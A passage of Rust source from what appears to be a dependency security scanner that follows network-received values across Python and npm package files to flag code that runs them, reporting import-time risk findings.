                        Some(Res::Sym(k, dot(&cl, rest[0])))
                    } else {
                        None
                    }
                }
                Res::Sym(..) => return got,
            };
            rest = &rest[1..];
        }
        got
    }

    /// The symbols that hold a received value (core._XfPackage.tainted).
    fn tainted(&self, xf: &Xf) -> HashSet<Sym> {
        // symbols(): {(key, name): (mod, ret, cls)}, at most _XF_MAX_SYMBOLS
        let mut syms: HashMap<Sym, (&Module, &Ret, Option<PyStr>)> = HashMap::new();
        for m in self.mods.values() {
            for (name, r) in m.defs.iter() {
                syms.insert((m.key.clone(), name.clone()), (m, r, None));
            }
            for (cls, meths) in m.classes.iter() {
                for (meth, (r, _st)) in meths.iter() {
                    syms.insert((m.key.clone(), dot(cls, meth)), (m, r, Some(cls.clone())));
                }
            }
            for (var, r) in m.env.iter() {
                syms.insert((m.key.clone(), concat(&[&u("<env>."), var])), (m, r, None));
            }
            if syms.len() >= xf.lim.max_symbols {
                break;
            }
        }
        let mut edges: Vec<(Sym, Vec<Sym>)> = Vec::with_capacity(syms.len());
        for (sym, (m, r, cls)) in &syms {
            let mut found = Vec::new();
            for chain in &r.refs {
                if let Some(Res::Sym(k, n)) = self.resolve_chain(xf, m, chain, cls.as_deref(), 0) {
                    found.push((k, n));
                }
            }
            edges.push((sym.clone(), found));
        }
        let mut tainted: HashSet<Sym> = syms.iter().filter(|(_, (_, r, _))| r.source).map(|(s, _)| s.clone()).collect();
        for _ in 0..xf.lim.rounds {
            let grew: Vec<Sym> = edges
                .iter()
                .filter(|(s, found)| !tainted.contains(s) && found.iter().any(|f| tainted.contains(f)))
                .map(|(s, _)| s.clone())
                .collect();
            if grew.is_empty() {
                break;
            }
            tainted.extend(grew);
        }
        tainted
    }

    /// The functions that run a parameter as code (core._XfPackage.runners):
    /// those whose own body does, then those that hand a parameter to one
    /// (a relay), up to _XF_ROUNDS hops.
    fn runners(&self, xf: &Xf) -> HashSet<Sym> {
        let mut out = self.direct_runners(xf);
        // (a body that names a runner may still only hand it on)
        let mut relays: Vec<(&Module, &PyStr, Vec<PyStr>, PyStr)> = Vec::new();
        for m in self.mods.values() {
            for (sym, (params, body)) in m.bodies.iter().chain(m.relays.iter()) {
                let mut names: Vec<PyStr> = params.iter().filter(|p| !Xf::in_set(xf.not_params, p)).cloned().collect();
                names.sort();
                names.dedup();
                if names.is_empty() || out.contains(&(m.key.clone(), sym.clone())) {
                    continue;
                }
                let refs: Vec<&[u32]> = body.iter().map(|r| r.as_slice()).collect();
                relays.push((m, sym, names, join_rows(&refs)));
            }
        }
        for _ in 0..xf.lim.rounds {
            if out.is_empty() || relays.is_empty() {
                break;
            }
            let running = self.marked_members(&out);
            let mut seeds_of: HashMap<PyStr, Vec<PyStr>> = HashMap::new();
            let mut grew: Vec<Sym> = Vec::new();
            let mut read = 0usize;
            for (m, sym, names, text) in &relays {
                let me: Sym = (m.key.clone(), (*sym).clone());
                if out.contains(&me) {
                    continue;
                }
                if !seeds_of.contains_key(&m.key) {
                    let mut set: BTreeSet<PyStr> = xf.seeds(self, m, &out, &[], &running).seeds.into_keys().collect();
                    for (k, n) in &out {
                        if k == &m.key && !n.contains(&c('.')) {
                            set.insert(n.clone());
                        }
                    }
                    seeds_of.insert(m.key.clone(), set.into_iter().collect());
                }
                let found: Vec<PyStr> = seeds_of[&m.key]
                    .iter()
                    .filter(|n| pystr::find(text, n, 0).is_some())
                    .take(xf.lim.max_seeds)
                    .cloned()
                    .collect();
                if found.is_empty() {
                    continue;
                }
                read += 1;
                if read > xf.lim.max_runners {
                    break;
                }
                if let Some((_, "run")) = received::received_code_kind(xf.p, text, names, &found) {
                    grew.push(me);
                }
            }
            if grew.is_empty() {
                break;
            }
            out.extend(grew);
        }
        out
    }

    /// The functions whose own body runs a parameter (core._XfPackage.direct_runners).
    fn direct_runners(&self, xf: &Xf) -> HashSet<Sym> {
        let mut out = HashSet::new();
        let mut count = 0usize;
        for m in self.mods.values() {
            for (sym, (params, body)) in m.bodies.iter() {
                let mut names: Vec<PyStr> = params.iter().filter(|p| !Xf::in_set(xf.not_params, p)).cloned().collect();
                names.sort();
                names.dedup();
                if names.is_empty() {
                    continue;
                }
                count += 1;
                if count > xf.lim.max_runners {
                    return out;
                }
                let refs: Vec<&[u32]> = body.iter().map(|r| r.as_slice()).collect();
                let text = join_rows(&refs);
                if let Some((_, "run")) = received::received_code_kind(xf.p, &text, &names, &[]) {
                    out.insert((m.key.clone(), sym.clone()));
                }
            }
        }
        out
    }

    /// The names module `key` exports, for its members (m.pull), sorted.
    fn names_of(&self, xf: &Xf, key: &[u32], depth: usize) -> BTreeSet<PyStr> {
        let m = match self.mods.get(key) {
            Some(m) if depth <= xf.lim.max_depth => m,
            _ => return BTreeSet::new(),
        };
        if m.lang == Lang::Py {
            let mut out: BTreeSet<PyStr> = m.defs.keys.iter().cloned().collect();
            out.extend(m.classes.keys.iter().cloned());
            out.extend(m.imports.keys.iter().filter(|n| !pystr::starts_with(n, "*")).cloned());
            return out;
        }
        let mut out: BTreeSet<PyStr> = m.exports.keys.iter().cloned().collect();
        out.extend(m.reexports.keys.iter().cloned());
        let mut stars: Vec<&PyStr> = m.stars.iter().collect();
        if let Some(dm) = m.default_module.as_ref().filter(|d| !d.is_empty()) {
            stars.push(dm);
        }
        for star in stars {
            out.extend(self.names_of(xf, star, depth + 1));
        }
        out
    }

    /// core._xf_marked_members: {(module key, class): [(member, static)]}
    fn marked_members(&self, marked: &HashSet<Sym>) -> HashMap<Sym, Vec<(PyStr, bool)>> {
        let mut out = HashMap::new();
        for m in self.mods.values() {
            for (cls, meths) in m.classes.iter() {
                let got: Vec<(PyStr, bool)> = meths
                    .iter()
                    .filter(|(meth, _)| marked.contains(&(m.key.clone(), dot(cls, meth))))
                    .map(|(meth, (_, st))| (meth.clone(), *st))
                    .collect();
                if !got.is_empty() {
                    out.insert((m.key.clone(), cls.clone()), got);
                }
            }
        }
        out
    }
}

/// What _xf_seeds finds for one module: {chain: label}, and the classes
/// whose member a new instance's call reaches directly.
#[derive(Default)]
struct Seeds {
    seeds: BTreeMap<PyStr, PyStr>,
    direct: Vec<(PyStr, PyStr, PyStr)>,
}

impl<'p> Xf<'p> {
    /// core._xf_instances
    fn instances(&self, text: &[u32], expr: &[u32], lang: Lang) -> BTreeSet<PyStr> {
        let mut src = u(r"(?<![\w$.])(?P<var>(?:(?:self|this)[ \t]*\.[ \t]*)?[A-Za-z_$][\w$]*)[ \t]*=[ \t]*");
        if lang == Lang::Js {
            src.extend(u(r"(?:new[ \t]+)?"));
        }
        src.extend(crate::pyre::escape(expr));
        src.extend(u(r"[ \t]*\("));
        let rx = rxutil::dynamic(src, 0);
        rx.finditer(text).map(|m| self.nospace(m.name("var").unwrap_or(&[]))).collect()
    }

    /// core._xf_seeds (add_class)
    #[allow(clippy::too_many_arguments)]
    fn add_class(
        &self,
        m: &Module,
        members: &HashMap<Sym, Vec<(PyStr, bool)>>,
        out: &mut Seeds,
        expr: &[u32],
        val: &Sym,
        label: &[u32],
    ) {
        let list = match members.get(val) {
            Some(l) => l,
            None => return,
        };
        let mut vars: Option<BTreeSet<PyStr>> = None;
        for (meth, st) in list {
            if *st {
                out.seeds.insert(dot(expr, meth), label.to_vec());
                continue;
            }
            let vs = vars.get_or_insert_with(|| self.instances(m.text, expr, m.lang));
            for var in vs.iter() {
                out.seeds.insert(dot(var, meth), label.to_vec());
            }
            out.direct.push((expr.to_vec(), meth.clone(), label.to_vec()));
        }
    }

    /// core._xf_seeds (add)
    #[allow(clippy::too_many_arguments)]
    fn add(
        &self,
        pkg: &Package,
        m: &Module,
        marked: &HashSet<Sym>,
        members: &HashMap<Sym, Vec<(PyStr, bool)>>,
        out: &mut Seeds,
        expr: &[u32],
        got: Option<Res>,
        label: &[u32],
        depth: usize,
    ) {
        let got = match got {
            Some(g) if depth <= 2 => g,
            _ => return,
        };
        match got {
            Res::Sym(k, n) => {
                if marked.contains(&(k, n)) {
                    out.seeds.insert(expr.to_vec(), label.to_vec());
                }
            }
            Res::Class(k, cl) => self.add_class(m, members, out, expr, &(k, cl), label),
            Res::Module(val) => {
                for (name, sub) in pkg.module_members(self, &val, self.lim.max_seeds * 4).iter() {
                    self.add(pkg, m, marked, members, out, &dot(expr, name), Some(sub.clone()), label, depth + 1);
                }
                // (a re-export may name a missing module)
                if pkg.mods.get(&val).is_some_and(|vm| vm.lang == Lang::Js) {
                    let d = pkg.export(self, &val, &u("default"));
                    self.add(pkg, m, marked, members, out, expr, d, label, depth + 1);
                }
            }
        }
    }

    /// core._xf_seeds
    fn seeds(
        &self,
        pkg: &Package,
        m: &Module,
        marked: &HashSet<Sym>,
        envs: &[(PyStr, Vec<PyStr>)],
        members: &HashMap<Sym, Vec<(PyStr, bool)>>,
    ) -> Seeds {
        let mut out = Seeds::default();
        for (local, imp) in m.imports.iter() {
            let label: &[u32] = imp.label.as_deref().unwrap_or(&[]);
            if pystr::starts_with(local, "*") {
                if let Some(k) = imp.key.as_ref().filter(|k| pkg.mods.contains(k)) {
                    for name in pkg.sorted_names(self, k).iter() {
                        let got = pkg.export(self, k, name);
                        self.add(pkg, m, marked, members, &mut out, name, got, label, 0);
                    }
                }
                continue;
            }
            let mut got = pkg.resolve_import(self, imp, 0);
            if got.is_none() && m.lang == Lang::Js && imp.kind == Kind::Default {
                if let Some(k) = imp.key.as_ref().filter(|k| pkg.mods.contains(k)) {
                    got = Some(Res::Module(k.clone())); // a CommonJS module imported by default is its exports
                }
            }
            self.add(pkg, m, marked, members, &mut out, local, got, label, 0);
        }
        // (a variable another file writes: one this file writes itself is the
        // single-file test's, which read the file already)
        for (var, keys) in envs {
            let label = match keys.iter().find(|k| **k != m.key) {
                Some(k) => k,
                None => continue,
            };
            if pystr::find(m.text, var, 0).is_some() {
                let prefix = if m.lang == Lang::Py { u("environ.") } else { u("process.env.") };
                out.seeds.insert(concat(&[&prefix, var]), label.clone());
            }
        }
        out
    }

    /// core._xf_rewrite: each call of a method on a new instance read as one
    /// seeded name, padded to its length; (code, [(name, label)]).
    fn rewrite(&self, code: PyStr, direct: &[(PyStr, PyStr, PyStr)], lang: Lang) -> (PyStr, Vec<(PyStr, PyStr)>) {
        let mut code = code;
        let mut names = Vec::new();
        for (n, (expr, meth, label)) in direct.iter().take(self.lim.max_seeds).enumerate() {
            let mut src = u(r"(?<![\w$.])");
            if lang == Lang::Js {
                src.extend(u(r"(?:new[ \t]+)?"));
            }
            src.extend(crate::pyre::escape(expr));
            src.extend(u(r"[ \t]*\([^()\n]{0,200}\)[ \t]*\.[ \t]*"));
            src.extend(crate::pyre::escape(meth));
            src.extend(u(r"(?![\w$])"));
            let rx = rxutil::dynamic(src, 0);
            let name = u(&format!("_xf{}", n));
            let mut count = 0usize;
            let new = rx.sub_fn(&code, 0, |m| {
                count += 1;
                ljust(name.clone(), m.group0().len())
            });
            code = new;
            if count > 0 {
                names.push((name, label.clone()));
            }
        }
        (code, names)
    }

    // ---------------- event emitters ----------------

    /// core._xf_emitter_of
    fn emitter_of(&self, pkg: &Package, m: &Module, name: &[u32]) -> Option<Emitter> {
        if let Some(imp) = m.imports.get(name) {
            return Some(match pkg.resolve_import(self, imp, 0) {
                Some(r) => Emitter::Res(r),
                None => Emitter::Import(imp.key.clone(), imp.name.clone()),
            });
        }
        if let Some(r) = pkg.resolve_local(self, m, name, 0) {
            return Some(Emitter::Res(r));
        }
        if Self::in_set(self.emit_globals, name) {
            Some(Emitter::Global(name.to_vec()))
        } else {
            None
        }
    }

    /// core._xf_calls: rx's matches in `text`, read only where at_re finds
    /// the member call a match makes (the first `max` of them).
    fn calls<'s>(&self, rx: &'s Regex, at_re: &'s Regex, text: &'s [u32], max: usize) -> Vec<crate::pyre::Match<'s>> {
        let mut out = Vec::new();
        let mut end = 0usize;
        for at in at_re.finditer(text) {
            if out.len() >= max {
                break;
            }
            let mut k = at.start();
            while k > 0 && (text[k - 1] == c(' ') || text[k - 1] == c('\t')) {
                k -= 1;
            }
            let mut s = k;
            while s > 0 && (pystr::is_alnum(text[s - 1]) || text[s - 1] == c('_') || text[s - 1] == c('$')) {
                s -= 1;
            }
            if s == k || s < end {
                continue; // no identifier; inside the last match
            }
            if let Some(m) = rx.match_at(text, s as isize, text.len() as isize) {
                end = m.end();
                out.push(m);
            }
        }
        out
    }

    /// core._xf_emitter_seeds: {module key: ({name: label}, [rows], line)}
    fn emitter_seeds(
        &self,
        pkg: &Package,
        tainted: &HashSet<Sym>,
        envs: &[(PyStr, Vec<PyStr>)],
        held: &HashMap<Sym, Vec<(PyStr, bool)>>,
    ) -> HashMap<PyStr, (BTreeMap<PyStr, PyStr>, Vec<PyStr>, usize)> {
        struct Hit {
            start: usize,
            end: usize,
            obj: PyStr,
            param: Option<PyStr>,
            handler: Option<PyStr>,
        }
        fn hit(m: &crate::pyre::Match) -> Hit {
            Hit {
                start: m.start(),
                end: m.end(),
                obj: m.name("obj").unwrap_or(&[]).to_vec(),
                param: m.name("fp").or_else(|| m.name("ap")).or_else(|| m.name("bp")).map(|s| s.to_vec()),
                handler: m.name("handler").map(|s| s.to_vec()),
            }
        }
        // emits: {(emitter, event): {module key: [match]}}, in core's order
        let mut emits: Vec<((Emitter, PyStr), Vec<(PyStr, Vec<Hit>)>)> = Vec::new();
        let mut emit_index: HashMap<(Emitter, PyStr), usize> = HashMap::new();
        for m in pkg.mods.values() {
            if m.lang != Lang::Js || pystr::find(m.text, &self.emit_needle, 0).is_none() {
                continue;
            }
            for mm in self.calls(self.rx.emit, self.rx.emit_at, m.text, self.lim.emit_max) {
                if let Some(emitter) = self.emitter_of(pkg, m, mm.name("obj").unwrap_or(&[])) {
                    let chan = (emitter, mm.name("event").unwrap_or(&[]).to_vec());
                    let i = *emit_index.entry(chan.clone()).or_insert_with(|| {
                        emits.push((chan, Vec::new()));
                        emits.len() - 1
                    });
                    let by_mod = &mut emits[i].1;
                    match by_mod.iter_mut().find(|(k, _)| *k == m.key) {
                        Some((_, list)) => list.push(hit(&mm)),
                        None => by_mod.push((m.key.clone(), vec![hit(&mm)])),
                    }
                }
            }
        }
        // a listener only matters for an event something emits: a file without any such event's name is not read
        let events: BTreeSet<&PyStr> = emits.iter().map(|((_, ev), _)| ev).collect();
        let mut listens: HashMap<(Emitter, PyStr), Vec<(PyStr, Hit)>> = HashMap::new();
        for m in pkg.mods.values() {
            if m.lang != Lang::Js || !events.iter().any(|ev| pystr::find(m.text, ev, 0).is_some()) {
                continue;
            }
            for mm in self.calls(self.rx.listen, self.rx.listen_at, m.text, self.lim.emit_max) {
                if let Some(emitter) = self.emitter_of(pkg, m, mm.name("obj").unwrap_or(&[])) {
                    let chan = (emitter, mm.name("event").unwrap_or(&[]).to_vec());
                    listens.entry(chan).or_default().push((m.key.clone(), hit(&mm)));
                }
            }
        }
        let mut comments: HashMap<PyStr, Vec<(usize, usize)>> = HashMap::new();
        let mut is_code = |key: &PyStr, h: &Hit| -> bool {
            let spans = comments.entry(key.clone()).or_insert_with(|| {
                let text = pkg.mods.get(key).map(|m| m.text).unwrap_or(&[]);
                if signs::reads_own_source(self.p, text) {
                    Vec::new()
                } else {
                    lexer::lex_comment_spans(self.p, text, Some("js"), None, true, None)
                }
            });
            // the last comment that starts before h ends
            let k = spans.partition_point(|s| s.0 < h.end);
            k == 0 || spans[k - 1].1 <= h.start
        };
        let mut codes: HashMap<PyStr, PyStr> = HashMap::new();
        let mut out: HashMap<PyStr, (BTreeMap<PyStr, PyStr>, Vec<PyStr>, usize)> = HashMap::new();
        for ((emitter, event), by_mod) in &emits {
            let chan = (emitter.clone(), event.clone());
            let mut by_mod: Vec<&(PyStr, Vec<Hit>)> = by_mod.iter().collect();
            by_mod.sort_by(|a, b| a.0.cmp(&b.0));
            for (key, ms) in by_mod {
                let heard: Vec<&(PyStr, Hit)> =
                    listens.get(&chan).map(|l| l.iter().filter(|(lkey, _)| lkey != key).collect()).unwrap_or_default();
                let objs: BTreeSet<PyStr> = if heard.is_empty() {
                    BTreeSet::new()
                } else {
                    ms.iter().filter(|h| is_code(key, h)).map(|h| h.obj.clone()).collect()
                };
                let heard: Vec<&(PyStr, Hit)> =
                    if objs.is_empty() { Vec::new() } else { heard.into_iter().filter(|(lkey, h)| is_code(lkey, h)).collect() };
                if heard.is_empty() {
                    continue;
                }
                let mut code = codes
                    .entry(key.clone())
                    .or_insert_with(|| signs::import_code(self.p, pkg.mods.get(key).map(|m| m.text).unwrap_or(&[]), "js"))
                    .clone();
                for obj in &objs {
                    let mut src = u(r"(?<![\w$.])");
                    src.extend(crate::pyre::escape(obj));
                    src.extend(u("[ \\t]*\\.[ \\t]*emit[ \\t]*\\([ \\t]*(['\\\"`])"));
                    src.extend(crate::pyre::escape(event));
                    src.extend(u(r"\1[ \t]*,"));
                    let rx = rxutil::dynamic(src, 0);
                    code = rx.sub_fn(&code, 0, |m| ljust(u("_xfe("), m.group0().len()));
                }
                let names: Vec<PyStr> = if tainted.is_empty() {
                    Vec::new()
                } else {
                    let m = match pkg.mods.get(key) {
                        Some(m) => m,
                        None => continue,
                    };
                    self.seeds(pkg, m, tainted, envs, held).seeds.into_keys().take(self.lim.max_seeds).collect()
                };
                match received::received_code_kind(self.p, &code, &names, &[u("_xfe")]) {
                    Some((_, "run")) => {}
                    _ => continue,
                }
                for (lkey, h) in heard {
                    let text = pkg.mods.get(lkey).map(|m| m.text).unwrap_or(&[]);
                    let line = pystr::count_char(text, c('\n'), 0, h.start) + 1;
                    let entry = out.entry(lkey.clone()).or_insert_with(|| (BTreeMap::new(), Vec::new(), line));
                    if let Some(param) = &h.param {
                        entry.0.insert(param.clone(), key.clone());
                    } else if let Some(handler) = &h.handler {
                        entry.0.insert(u("_xfr"), key.clone());
                        entry.1.push(concat(&[handler, &u("(_xfr)")]));
                    }
                    entry.2 = entry.2.min(line);
                }
            }
        }
        out
    }

    // ---------------- findings ----------------

    /// core._xf_issue: the follower's SC-IMPORT-RISK finding (as scan_file's
    /// findings come: [rule, name, type, sev, msg, why, fix, ref, line,
    /// snippet, snipStart]).
    fn issue(&self, text: &[u32], line: usize, cat: &str, srcs: &[PyStr], who: &[u32], runner: bool) -> Value {
        let p = self.p;
        let lines = pystr::split_char(text, c('\n'));
        let refs: Vec<&[u32]> = srcs.iter().map(|s| s.as_slice()).collect();
        let where_ = pystr::join(&u(", "), &refs);
        let k = runner as usize;
        let tail = findings::format(&p.strs("_XF_TAILS")[k], &[("where", Arg::S(where_.clone()))]);
        let reason = signs::cat_reason(p, cat);
        let mut rule = RuleText::of(p, "_XF_RULE");
        rule.sev = u(signs::import_time_severity(p, &[reason.clone()]));
        rule.msg = concat(&[who, &u(" "), &reason, &u("; "), &tail, &u(".")]);
        rule.fix = findings::format(&p.strs("_XF_FIXES")[k], &[("where", Arg::S(where_))]);
        let snippets = Snippets::new(p, lines, self.redact, self.neumaier);
        snippets.issue(&Finding::new(rule, line, None))
    }

    /// core._xf_package_issues: [(file index, issue)] for one package's modules.
    fn package_issues(&self, pkg: &Package, skip: &HashSet<PyStr>, paths: &[PyStr], whos: &[PyStr]) -> Vec<(usize, Value)> {
        let tainted = pkg.tainted(self);
        let runners = pkg.runners(self);
        let mut sorted_tainted: Vec<&Sym> = tainted.iter().collect();
        sorted_tainted.sort();
        // the environment variables written with a received value: (name, the files that do)
        let mut envs: Vec<(PyStr, Vec<PyStr>)> = Vec::new();
        for (key, name) in sorted_tainted {
            if pystr::starts_with(name, "<env>.") {
                let var = name[6..].to_vec();
                match envs.iter_mut().find(|(v, _)| *v == var) {
                    Some((_, keys)) => keys.push(key.clone()),
                    None => envs.push((var, vec![key.clone()])),
                }
            }
        }
        let held = pkg.marked_members(&tainted);
        let running = pkg.marked_members(&runners);
        let heard = self.emitter_seeds(pkg, &tainted, &envs, &held);
        if tainted.is_empty() && runners.is_empty() && heard.is_empty() {
            return Vec::new();
        }
        let mut out = Vec::new();
        let empty: (BTreeMap<PyStr, PyStr>, Vec<PyStr>, usize) = (BTreeMap::new(), Vec::new(), 0);
        for m in pkg.mods.values() {
            if skip.contains(&paths[m.file]) {
                continue;
            }
            let found = if tainted.is_empty() { Seeds::default() } else { self.seeds(pkg, m, &tainted, &envs, &held) };
            let run_seeds = if runners.is_empty() {
                BTreeMap::new()
            } else {
                self.seeds(pkg, m, &runners, &[], &running).seeds
            };
            let (given, rows, first) = heard.get(&m.key).unwrap_or(&empty);
            if found.seeds.is_empty() && found.direct.is_empty() && run_seeds.is_empty() && given.is_empty() {
                continue;
            }
            let code = signs::import_code(self.p, m.text, m.lang.name());
            if received::received_code_kind(self.p, &code, &[], &[]).is_some() {
                continue; // the file shows it alone: the single-file test's
            }
            let Seeds { mut seeds, direct } = found;
            let (code, more) = self.rewrite(code, &direct, m.lang);
            for (n, l) in more {
                seeds.insert(n, l);
            }
            let mut names: Vec<PyStr> = seeds.keys().take(self.lim.max_seeds).cloned().collect();
            let who = &whos[m.file];
            let labels = |map: &BTreeMap<PyStr, PyStr>, names: &[PyStr]| -> Vec<PyStr> {
                let set: BTreeSet<PyStr> = names.iter().filter_map(|n| map.get(n).cloned()).collect();
                set.into_iter().collect()
            };
            let res = if names.is_empty() { None } else { received::received_code_kind(self.p, &code, &names, &[]) };
            if let Some((line, cat)) = res {
                out.push((m.file, self.issue(m.text, line, cat, &labels(&seeds, &names), who, false)));
                continue;
            }
            if !given.is_empty() {
                // the listeners' parameters seeded; a handler given by name called after the file
                let end = pystr::count_char(&code, c('\n'), 0, code.len()) + 1;
                let mut both = seeds.clone();
                for (k, v) in given {
                    both.insert(k.clone(), v.clone());
                }
                names = both.keys().take(self.lim.max_seeds).cloned().collect();
                let mut text = code.clone();
                for r in rows {
                    text.push(c('\n'));
                    text.extend_from_slice(r);
                }
                if let Some((line, cat)) = received::received_code_kind(self.p, &text, &names, &[]) {
                    let line = if line > end { *first } else { line };
                    out.push((m.file, self.issue(m.text, line, cat, &labels(&both, &names), who, false)));
                    continue;
                }
            }
            if !run_seeds.is_empty() {
                let run_names: Vec<PyStr> = run_seeds.keys().take(self.lim.max_seeds).cloned().collect();
                if let Some((line, "run")) = received::received_code_kind(self.p, &code, &names, &run_names) {
                    out.push((m.file, self.issue(m.text, line, "run", &labels(&run_seeds, &run_names), who, true)));
                }
            }
        }
        out
    }
}

/// `path` with `sep` written as '/' (path.replace(os.sep, "/")); an empty
/// `sep` is '/'.
fn slashed(path: &[u32], sep: &[u32]) -> PyStr {
    if sep.is_empty() || sep == [c('/')] {
        path.to_vec()
    } else {
        pystr::replace(path, sep, &[c('/')])
    }
}

// ---------------- the packages of a scan ----------------

/// One file the follower may read.
pub struct File<'t> {
    pub path: PyStr,
    /// "py", "js" (anything else is not read)
    pub lang: PyStr,
    pub text: &'t [u32],
    /// what the finding's message starts with ("Dependency code"; a registry scan names the file)
    pub who: PyStr,
    /// the package a Python file is read in when not its top-level name's
    /// (core._xf_site_groups: a distribution's top-level modules)
    pub group: Option<PyStr>,
}

/// What became of one package.
pub enum Outcome {
    /// the findings: [(file index, issue)]
    Issues(Vec<(usize, Value)>),
    /// the package spent its work budget, or the engine panicked on it
    Failed(&'static str),
}

/// One package core's follower would read: (lang, root) and its members
/// [(module key, extra, file index)] (core._xf_groups).
pub struct Group {
    pub lang: Lang,
    pub root: PyStr,
    members: Vec<(PyStr, Extra, usize)>,
}

enum Extra {
    Pkg(bool),
    Rel(PyStr),
}

impl<'p> Xf<'p> {
    /// core._xf_py_module: (top package, dotted module, is_package)
    fn py_module(&self, path: &[u32]) -> Option<(PyStr, PyStr, bool)> {
        let parts = pystr::split_char(path, c('/'));
        let mut idx: isize = -1;
        for marker in self.dep_markers {
            if let Some(pos) = parts.iter().rposition(|x| *x == marker.as_slice()) {
                idx = idx.max(pos as isize);
            }
        }
        let rel: &[&[u32]] = if idx >= 0 && (idx as usize) < parts.len() - 1 { &parts[idx as usize + 1..] } else { &[] };
        let last = rel.last()?;
        if !pystr::ends_with(last, ".py") {
            return None;
        }
        let stem = &last[..last.len() - 3];
        let is_pkg = is(stem, "__init__");
        let mut mod_parts: Vec<&[u32]> = rel[..rel.len() - 1].to_vec();
        if !is_pkg {
            mod_parts.push(stem);
        }
        if mod_parts.is_empty() {
            return None;
        }
        Some((rel[0].to_vec(), pystr::join(&[c('.')], &mod_parts), is_pkg))
    }

    /// core._xf_groups
    pub fn groups(&self, files: &[File], one_package: bool, sep: &[u32]) -> Vec<Group> {
        let mut out: Vec<Group> = Vec::new();
        let mut index: HashMap<(Lang, PyStr), usize> = HashMap::new();
        let mut push = |lang: Lang, root: PyStr, member: (PyStr, Extra, usize)| {
            let i = *index.entry((lang, root.clone())).or_insert_with(|| {
                out.push(Group { lang, root, members: Vec::new() });
                out.len() - 1
            });
            out[i].members.push(member);
        };
        for (i, f) in files.iter().enumerate() {
            if is(&f.lang, "py") {
                if let Some((top, dotted, is_pkg)) = self.py_module(&slashed(&f.path, sep)) {
                    let root = if one_package { Vec::new() } else { f.group.clone().unwrap_or(top) };
                    push(Lang::Py, root, (dotted, Extra::Pkg(is_pkg), i));
                }
            } else if is(&f.lang, "js") {
                let path = slashed(&f.path, sep);
                if let Some(root) = js_package(&path) {
                    let rel = pystr::from(&path, root.len() + 1).to_vec();
                    push(Lang::Js, root, (js_norm(&rel), Extra::Rel(rel), i));
                }
            }
        }
        out
    }

    /// core._xf_group_issues, but for the bounds: the package's modules read
    /// and its findings.
    fn group_issues(&self, group: &Group, files: &[File], skip: &HashSet<PyStr>, paths: &[PyStr], whos: &[PyStr]) -> Vec<(usize, Value)> {
        let mut mods: OMap<Module> = OMap::default();
        // (mods[key] = mod: the last file of a key is read, in the first one's place)
        let mut last: HashMap<&[u32], usize> = HashMap::new();
        for (k, (key, _, _)) in group.members.iter().enumerate() {
            last.insert(key.as_slice(), k);
        }
        for (key, _, _) in &group.members {
            if mods.contains(key) {
                continue;
            }
            let (key, extra, i) = &group.members[last[key.as_slice()]];
            let mut m = Module::new(key.clone(), group.lang, *i, files[*i].text);
            match extra {
                Extra::Pkg(is_pkg) => {
                    let parts = pystr::split_char(key, c('.'));
                    let pkg_parts: &[&[u32]] = if *is_pkg { &parts } else { &parts[..parts.len() - 1] };
                    self.py_parse(&mut m, pkg_parts);
                }
                Extra::Rel(rel) => self.js_parse(&mut m, rel),
            }
            mods.insert(key.clone(), m);
        }
        let pkg = Package {
            mods,
            exported: RefCell::new(HashMap::new()),
            names: RefCell::new(HashMap::new()),
            members: RefCell::new(HashMap::new()),
        };
        self.package_issues(&pkg, skip, paths, whos)
    }

    /// Will core's follower read this package (two files or more, at most
    /// _XF_MAX_FILES, one of them naming a network source)?
    fn reads(&self, group: &Group, files: &[File]) -> bool {
        let n = group.members.len();
        (2..=self.lim.max_files).contains(&n) && group.members.iter().any(|(_, _, i)| self.needles.any_in(files[*i].text))
    }
}

/// core._xf_js_package: the npm package root a dependency file lives in.
fn js_package(path: &[u32]) -> Option<PyStr> {
    let parts = pystr::split_char(path, c('/'));
    if parts.len() < 2 {
        return None;
    }
    for i in (0..=parts.len() - 2).rev() {
        if is(parts[i], "node_modules") {
            if pystr::starts_with(parts[i + 1], "@") && i + 2 < parts.len() {
                return Some(pystr::join(&[c('/')], &parts[..i + 3]));
            }
            return Some(pystr::join(&[c('/')], &parts[..i + 2]));
        }
    }
    None
}

/// The options of one `cross_file` call.
pub struct Options {
    pub one_package: bool,
    pub sep: PyStr,
    pub redact: bool,
    pub neumaier: bool,
    pub threads: usize,
    /// the work budget of each package (crate::budget)
    pub steps: u64,
}

/// core._cross_file_received_issues: for each package core's follower
/// reads, its findings (or that it failed), in core's order.
pub fn cross_file(p: &Pack, files: &[File], skip: &HashSet<PyStr>, opts: &Options) -> Vec<(Group, Outcome)> {
    let xf = Xf::new(p, opts.redact, opts.neumaier);
    let groups: Vec<Group> = xf.groups(files, opts.one_package, &opts.sep).into_iter().filter(|g| xf.reads(g, files)).collect();
    let paths: Vec<PyStr> = files.iter().map(|f| slashed(&f.path, &opts.sep)).collect();
    let whos: Vec<PyStr> = files.iter().map(|f| f.who.clone()).collect();
    let run = |g: &Group| -> Outcome {
        let r = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            crate::budget::call_with(opts.steps, || xf.group_issues(g, files, skip, &paths, &whos))
        }));
        // (the budget is the package's: the call goes on with a fresh one)
        crate::budget::reset(opts.steps);
        match r {
            Ok(Ok(issues)) => Outcome::Issues(issues),
            Ok(Err(_)) => Outcome::Failed("exhausted"),
            Err(_) => Outcome::Failed("panic"),
        }
    };
    let threads = if cfg!(target_arch = "wasm32") { 1 } else { opts.threads.clamp(1, crate::api::MAX_THREADS).min(groups.len().max(1)) };
    let outcomes: Vec<Outcome> = if threads <= 1 {
        groups.iter().map(&run).collect()
    } else {
        let next = std::sync::atomic::AtomicUsize::new(0);
        let done: Vec<Vec<(usize, Outcome)>> = std::thread::scope(|scope| {
            let workers: Vec<_> = (0..threads)
                .map(|_| {
                    scope.spawn(|| {
                        let mut mine = Vec::new();
                        loop {
                            let i = next.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                            if i >= groups.len() {
                                break;
                            }
                            mine.push((i, run(&groups[i])));
                        }
                        mine
                    })
                })
                .collect();
            workers.into_iter().map(|w| w.join().unwrap_or_default()).collect()
        });
        let mut slots: Vec<Option<Outcome>> = (0..groups.len()).map(|_| None).collect();
        for (i, o) in done.into_iter().flatten() {
            slots[i] = Some(o);
        }
        slots.into_iter().map(|o| o.unwrap_or(Outcome::Failed("panic"))).collect()
    };
    groups.into_iter().zip(outcomes).collect()
}

/// The `cross_file` call's answer: [{lang, root, issues: [[file index, issue], …]} | {lang, root, failed}]
/// for each package with findings or that failed, in core's order.
